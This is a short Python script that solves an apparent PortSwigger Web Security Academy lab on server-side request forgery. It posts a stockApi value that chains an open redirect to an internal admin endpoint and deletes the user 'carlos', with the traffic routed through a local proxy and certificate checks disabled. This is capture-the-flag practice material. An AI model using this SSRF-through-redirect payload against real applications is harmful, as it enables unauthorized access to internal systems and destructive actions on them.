'''
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.
'''

import requests

def main():
  proxies = {
      'http': '127.0.0.1:8080',
      'https': '127.0.0.1:8080'
  }

  s = requests.Session()
  s.proxies.update(proxies)
  s.verify = False
  
  url = "https://0ac1001c038a05f2801108f100310004.web-security-academy.net"
  
  payload = {
      'stockApi':"/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos",
  }

  r = s.post(f"{url}/product/stock", data=payload)

if __name__ == "__main__":
  main()